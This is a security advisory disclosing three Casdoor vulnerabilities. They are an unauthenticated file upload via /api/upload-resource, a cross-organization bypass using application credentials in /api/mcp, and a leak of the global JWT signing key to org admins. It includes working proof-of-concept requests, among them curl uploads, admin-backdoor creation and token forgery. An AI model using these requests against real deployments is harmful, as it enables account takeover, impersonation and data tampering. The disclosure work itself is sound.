
https://github.com/casdoor/casdoor/

## Finding 1: Unauthenticated Arbitrary File Upload via `/api/upload-resource`

Affected Versions: commit 0585ecf, docker `casbin/casdoor-all-in-one:latest`

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L

Score: 8.2 High

CWE: CWE-862 (Missing Authorization) + CWE-434 (Unrestricted Upload of File with Dangerous Type)

### Summary

The `POST /api/upload-resource` endpoint in Casdoor accepts uploads from completely unauthenticated callers. The Casbin authorization policy whitelists this route for the anonymous principal (`p, *, *, POST, /api/upload-resource, *, *`), and the controller's helper that resolves the target storage provider (`GetProviderFromContext`) returns the provider directly when a `?provider=` query parameter is supplied, bypassing the `RequireSignedIn` check that gates the fallback path. Any storage provider configured by an administrator (S3, Aliyun OSS, Local File System, Azure Blob, etc.) becomes a public write destination. The resulting `Resource` record is registered under the attacker-supplied `owner` / `user` / `application` query parameters, so the upload appears as if it were performed by an arbitrary legitimate user. When the storage provider serves uploaded files back (Local File System provider exposes `/files/<path>`), the attacker can retrieve the file with no authentication, creating a fully unauthenticated read-after-write primitive against the host.

### Root cause

1. **Casbin policy permits anonymous POST.** `authz/authz.go` (line ~100) seeds a policy line:
   ```
   p, *, *, POST, /api/upload-resource, *, *
   ```
   `ApiFilter` (`routers/authz_filter.go`) admits any anonymous request whose method+path matches this rule.

2. **`GetProviderFromContext` skips authentication when `?provider=` is set.** `controllers/util.go:205-256`:
   ```go
   func (c *ApiController) GetProviderFromContext(category string) (*object.Provider, error) {
       providerName := c.Ctx.Input.Query("provider")
       if providerName != "" {
           provider, err := object.GetProvider(util.GetId("admin", providerName))
           // returns provider WITHOUT calling RequireSignedIn
           return provider, nil
       }
       userId, ok := c.RequireSignedIn()  // line 232 -- only reached when providerName==""
       ...
   }
   ```

3. **`UploadResource` writes to the resolved provider with attacker-controlled metadata.** `controllers/resource.go:222-290`:
   ```go
   owner := c.Input().Get("owner")
   user  := c.Input().Get("user")
   application := c.Input().Get("application")
   fullFilePath := c.Input().Get("fullFilePath")
   ...
   provider, err := c.GetProviderFromContext("Storage")
   ...
   fileUrl, objectKey, err := object.UploadFileSafe(provider, fullFilePath, fileBuffer, ...)
   ```
   No authentication or ownership check sits between the parameter read and the storage write.

### PoC -- Validation (Docker)

Tested against `casbin/casdoor-all-in-one:latest` (commit `0585ecf`) on 2026-05-25:

1. Bring up Casdoor:
   ```
   docker run -d --name casdoor -p 8000:8000 casbin/casdoor-all-in-one:latest
   ```

2. As admin, create a storage provider (one-time setup an operator would normally do):
   ```
   POST /api/add-provider
   {"owner":"admin","name":"provider-fs-test","category":"Storage","type":"Local File System",
    "method":"Normal","domain":"http://localhost:8000","bucket":"files",
    "endpoint":"http://localhost:8000/files"}
   ```
   Casdoor's "Local File System" provider stores under `/files/` served by the same Casdoor process.

3. Disconnect / use a fresh client (no session, no cookie, no token). Upload an arbitrary file pretending to belong to `admin`:
   ```
   $ curl -s -X POST \
       "http://localhost:8000/api/upload-resource?owner=admin&user=admin&application=app-built-in&fullFilePath=public/exploit.txt&provider=provider-fs-test" \
       -F "file=@/tmp/payload.txt"
   {"status":"ok","msg":"","data":"http://localhost:8000/files/public/exploit.txt", ... }
   ```
   HTTP 200. The response includes the public URL of the uploaded file.

4. Retrieve the file unauthenticated:
   ```
   $ curl -s "http://localhost:8000/files/public/exploit.txt"
   MALICIOUS_PAYLOAD_1779714410 - unauthenticated upload demonstration
   ```

5. The resource is registered in Casdoor as an `admin` upload visible in the admin UI:
   ```
   $ curl -s -b admin-cookies "http://localhost:8000/api/get-resources?owner=admin"
   {"data":[{"owner":"admin","name":"/public/exploit.txt","user":"admin","provider":"provider-fs-test", ... }]}
   ```

### Impact

- **Anonymous arbitrary file upload to any configured storage provider** (operator-supplied S3, OSS, Azure Blob, or Local FS). Lets an attacker burn the operator's storage quota, plant phishing payloads on the operator's S3 bucket, store CSAM-class content on operator infrastructure, or deliver malware from a trusted domain that the operator owns.
- **Anonymous write-then-read primitive** when the provider's `domain` is publicly served (the Casdoor-bundled Local FS provider is served from the same Casdoor host; S3/OSS buckets are normally directly readable too): the attacker uploads a file and then GETs it without authentication.
- **Identity spoofing in audit trails:** `owner`, `user`, `application`, `createdTime`, `description`, and `tag` are all attacker-controlled. The resource entry in Casdoor's admin UI shows the upload as if it were performed by the named legitimate user. Subsequent forensic review will incorrectly attribute the upload.
- **Provider name discovery is feasible:** Casdoor leaks provider names through (a) `GET /api/get-application` (anonymous-readable) for any application that lists a configured Storage provider in its `providers[]`, (b) any deployment that has previously processed a legitimate upload and links to the storage URL, (c) operator-typical naming conventions (`provider-s3-prod`, `provider_storage_built-in`, etc.). An attacker can also brute-force names from a small wordlist (the controller returns a specific "provider not found" message vs. "Affected" success).


### Disclosure
 - 25 May 2026 - reported via email
 - ~26 June 2026 - no email response, opened https://github.com/casdoor/casdoor/issues/5617 with limited info
 - issue deleted with no explanation
   
<img width="958" height="310" alt="image" src="https://github.com/user-attachments/assets/a5eb0b34-5e92-4912-a82a-55d29285e7d8" />




## Finding 2: Application-credential authorization bypass in /api/mcp enables unrestricted cross-organization user administration

Affected Versions: commit c922487

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.6 Critical)

CWE: CWE-285 Improper Authorization (with CWE-639)

### Summary

A request carrying any application's OAuth `clientId`/`clientSecret` is resolved to the subject `app/<appname>`, and the central authorization check returns an unconditional global allow for any subject owned by `app`, skipping the casbin policy and all organization scoping. The newly added `/api/mcp` user CRUD tools read `owner`/`id`/user fields directly from request arguments with no org scoping, so any tenant's own application credentials grant unrestricted cross-organization user administration: enumerate users (including password salts), create admin backdoors, update, and delete users in any other organization. Confirmed against the built binary: an attacker app's credentials read, created an admin, and deleted a user in a different organization.

### Details

Flow:

1. `routers/authz_filter.go` `getUsername` -> `routers/base.go:113 getUsernameByClientIdSecret`: a request with `?clientId=...&clientSecret=...` (or HTTP Basic) that matches any application resolves the subject to `app/<appname>`.
2. `authz/authz.go:173` `IsAllowed`: `if subOwner == "app" { return true, nil }` -- an unconditional global allow with no organization scoping; the casbin policy and per-object owner check are skipped.
3. `routers/mcp_util.go getMcpObject` returns `("","")` for user tools, so the object-owner derivation is empty (moot, since step 2 already short-circuits).
4. `mcpself/base.go:433 checkToolPermission`: for the app identity returns `true` with no scope check.
5. `mcpself/user.go` handlers (`handleGetUsersTool`, `handleAddUserTool`, `handleUpdateUserTool`, `handleDeleteUserTool`) read `owner`/`id`/the full `object.User` directly from request arguments with no organization scoping.

The boundary crossed is cross-organization: an application's `clientId`/`clientSecret` is a per-application credential, legitimately known to that one app's owner (e.g. an org admin of org A configuring their own application) and intended only to issue/validate OAuth tokens for that one application. This finding shows those credentials grant unrestricted, cross-organization user administration over every other tenant.

### PoC

(available upon request)

```
POST /api/mcp?clientId=<attacker-app clientId>&clientSecret=<attacker-app clientSecret>
  tool get_users    {"owner":"victim-org"}                         -> victim users incl. passwordSalt/email
  tool add_user     {"owner":"victim-org","name":"attacker-backdoor","isAdmin":true,...}  -> admin backdoor
  tool delete_user  {"owner":"victim-org","name":"victim-alice"}    -> victim deleted
```

Validated against the built binary (sqlite, default seed): created `victim-org` with user `victim-org/victim-alice`, and a separate `attacker-org` with its own app `attacker-app`. Using only `?clientId=<attacker-app>&clientSecret=<attacker-app>` and no session cookie:

```
get_users {owner:"victim-org"}   -> returned victim-alice's full record incl. passwordSalt, email (cross-org enumeration)
add_user  {owner:"victim-org", isAdmin:true, ...} -> "Successfully added user"; victim-org/attacker-backdoor exists, isAdmin=True
delete_user {owner:"victim-org", name:"victim-alice"} -> "Successfully deleted user"; victim no longer exists
Negative controls: no credentials -> -32001 Unauthorized; wrong clientSecret -> -32001 Unauthorized
```

The negative controls prove the bypass is specifically the `subOwner=="app"` path, not a globally-open route.

### Impact

Any holder of one valid application's client credentials (any tenant's own app) gains unauthenticated-to-the-filter, unrestricted, cross-organization user administration: enumerate users and password salts, create admin backdoors, update, and delete users in any organization. Full cross-tenant confidentiality, integrity, and availability over the identity store; scope changed (a credential scoped to one app/org affects all orgs).

### Disclosure
 - 13 June 2026 - reported via email
 - ~26 June 2026 - no email response, opened https://github.com/casdoor/casdoor/issues/5618 with limited info to ask for review
 - issue deleted with no explanation

<img width="942" height="350" alt="image" src="https://github.com/user-attachments/assets/037e693c-6d97-4c23-8147-1386a5db818e" />


## Finding 3: Organization admin can read the global built-in JWT signing private key via /api/get-certs and /api/get-cert (incomplete fix of #3003) — enables cross-organization token forgery

Version: commit 6e443ad

### Summary

Any organization administrator (a non-global admin whose `isAdmin` is true only inside their own organization) can retrieve the instance-wide built-in certificate `admin/cert-built-in` — including its RSA `privateKey` — fully unmasked. That certificate is Casdoor's default JWT signing key: by default every organization's applications sign their OAuth/OIDC access and ID tokens with it. Disclosure of the private key lets the org admin forge arbitrary JWTs (any user, any organization, including `built-in/admin`) that pass signature verification against the public key Casdoor publishes at `/.well-known/jwks`. This is a cross-tenant confidentiality and integrity break of the platform's trust root.

This is an incomplete fix of issue #3003 ("Admin any org can get tokens or cert from another org"). The originally reported endpoints (`/api/get-global-certs`, `/api/get-global-certs?owner=admin`) are now blocked for org admins, but two sibling paths still leak the same key.

### Details

Two compounding defects:

1. Masking is gated on `IsAdmin()`, which is true for any org admin, not just global admins.
   `controllers/cert.go` `GetCerts` (line 48/72), `GetGlobalCerts` (105/129) and `GetCert` (line 156) all mask private keys only `if !c.IsAdmin()`. `controllers/base.go:51 IsAdmin()` returns `isGlobalAdmin || user.IsAdmin` (line 57) — i.e. true for an admin of any single organization. So an org admin receives certs UNMASKED.

2. The object queries fold the global `admin`-owned certs into a caller's own-org request.
   `object/cert.go:80 GetCerts(owner)` filters with `WHERE owner = 'admin' OR owner = <owner>` (line 84). So `GetCerts("attacker-org")` returns the global `admin/cert-built-in` row. `object/cert.go:167 GetCert(id)` additionally falls back to `getCert("admin", name)` when the cert is not found under the requested owner (line 173), so `GetCert("attacker-org/cert-built-in")` returns the global `admin/cert-built-in`.

The authorization filter (`routers/authz_filter.go`) derives the object owner for these GET endpoints from the `owner` query param / `id` (`get-certs?owner=attacker-org` -> objOwner=`attacker-org`; `get-cert?id=attacker-org/cert-built-in` -> objOwner=`attacker-org`). `authz/authz.go IsAllowed` then allows because `user.IsAdmin && subOwner == objOwner` (attacker-org == attacker-org). The filter only ever sees the caller's own org as the object owner; it never learns that the row actually returned is the global `admin` cert. The #3003 fix that blocks `owner=admin` (objOwner=`admin` -> denied) is therefore bypassed: the attacker names their own org, and the `OR owner='admin'` union / the `getCert("admin", ...)` fallback substitutes the global cert after the authorization check has already passed.

`admin/cert-built-in` is seeded by `object/init.go initBuiltInCert` with `Owner:"admin", Name:"cert-built-in", Scope:"JWT"` and is the default `cert` of the built-in application and of new applications; its private key signs the JWTs of the whole instance.

### PoC

Preconditions: attacker is an admin of one organization (`attacker-org/evil`, `isAdmin=true`, `isGlobalAdmin=false`) — the normal state of any tenant admin in a multi-tenant deployment.

```
# As the org admin (session cookie of attacker-org/evil), no global-admin rights:
GET /api/get-certs?owner=attacker-org
  -> 200 {status:ok}; data[0] = admin/cert-built-in with
     "privateKey":"-----BEGIN PRIVATE KEY-----\nMIIJK...   (UNMASKED)

GET /api/get-cert?id=attacker-org/cert-built-in
  -> 200 {status:ok}; admin/cert-built-in privateKey UNMASKED (admin-fallback)

# Forge a token with the leaked key and verify against Casdoor's own JWKS:
#   header {"alg":"RS256","kid":"cert-built-in"}
#   claims {"owner":"built-in","name":"admin","sub":"built-in/admin","isGlobalAdmin":true,...}
# jwt.decode(forged, <public key from /.well-known/jwks>, algorithms=["RS256"]) -> VALID
```

Negative controls (same org-admin session):
```
GET /api/get-global-certs            -> {status:error, "Unauthorized operation"}   (#3003 fix works)
GET /api/get-global-certs?owner=admin-> {status:error, "Unauthorized operation"}   (#3003 fix works)
GET /api/get-cert?id=admin/cert-built-in -> {status:error, "Unauthorized operation"} (direct cross-org blocked)
# Plain non-admin user, GET /api/get-certs?owner=attacker-org -> {status:error}      (masking/authz fine)
```
The controls isolate the bug to the `owner=<ownOrg>` list path and the `id=<ownOrg>/cert-built-in` admin-fallback, both of which slip the global `admin` cert past the org-scope check while `IsAdmin()` disables masking.

Validated against a self-built binary (commit 6e443ad, sqlite, default seed): the leaked private-key modulus equals the modulus of the key published at `/.well-known/jwks` (4096-bit), and a forged `built-in/admin` token signed with the leaked key verifies against that JWKS public key.

### Impact

A single-organization admin obtains the instance's default JWT signing private key and can forge valid OAuth/OIDC access and ID tokens for any user in any organization, including the global super-admin `built-in/admin`. Every relying party that trusts this Casdoor instance and validates tokens by JWKS signature (the standard OIDC pattern) will accept the forged tokens. Result: full cross-organization authentication bypass / account takeover and impersonation across all tenants and all SSO-integrated downstream applications. Scope is changed: a credential of one org compromises the whole platform's trust root.

### Disclosure
 - 20 June 2026 - reported via email
 - ~26 June 2026 - no email response, opened https://github.com/casdoor/casdoor/issues/5619 to ask for review
 - issue deleted with no explanation

